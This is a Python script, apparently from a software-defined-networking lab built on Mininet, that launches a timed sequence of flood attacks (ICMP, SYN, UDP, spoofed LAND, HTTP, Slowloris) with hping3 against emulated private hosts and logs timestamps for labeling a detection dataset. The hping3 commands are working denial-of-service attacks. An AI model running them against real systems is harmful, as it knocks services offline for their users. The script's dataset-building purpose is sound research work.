"""run_attack.py - Generate labeled attack traffic and log timestamps.

Usage
-----
    sudo python3 services/attacks/run_attack.py

Run from Mininet CLI after starting services.
Generates each attack type for ATTACK_DURATION seconds with a pause between.
Writes run_attack_log.json with exact unix timestamps for automatic labeling.
"""

import subprocess
import time
import json
from datetime import datetime

ATTACK_DURATION = 200  # seconds per attack
PAUSE           = 50   # seconds between attacks
LOG_PATH = '../ryu-controller/run_attack_log.json'

ATTACKS = [
    {
        'name':    'ICMP_flood',
        'cmd':     'hping3 --icmp -i u1000 192.168.10.10',
    },
    {
        'name':    'SYN_flood',
        'cmd':     'hping3 -S -p 80 -i u1000 192.168.10.10',
    },
    {
        'name':    'UDP_flood',
        'cmd':     'hping3 --udp -p 53 -i u1000 192.168.20.12',
    },
    {
        'name':    'HTTP_flood',
        'cmd':     'hping3 -S -p 80 --faster 192.168.10.10',
    },
    {
        'name':    'LAND_attack',
        'cmd':     'hping3 -S -p 80 --spoof 192.168.10.10 192.168.10.10',
    },
    {
        'name': 'SLOWLORIS',
        'cmd':  'python3 ../services/attacks/slowloris.py',
    },
]

log = []

for attack in ATTACKS:
    print(f'\n[+] Starting {attack["name"]}...')
    start = time.time()

    proc = subprocess.Popen(
        attack['cmd'], shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    time.sleep(ATTACK_DURATION)
    proc.terminate()
    proc.wait()

    end = time.time()

    log.append({
        'attack_type': attack['name'],
        'start':       start,
        'end':         end,
    })

    print(f'    start: {start}')
    print(f'    end:   {end}')
    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s...')
    time.sleep(PAUSE)

# save log
with open(LOG_PATH, 'w') as f:
    json.dump(log, f, indent=2)

print(f'\nAttack log saved to {LOG_PATH}')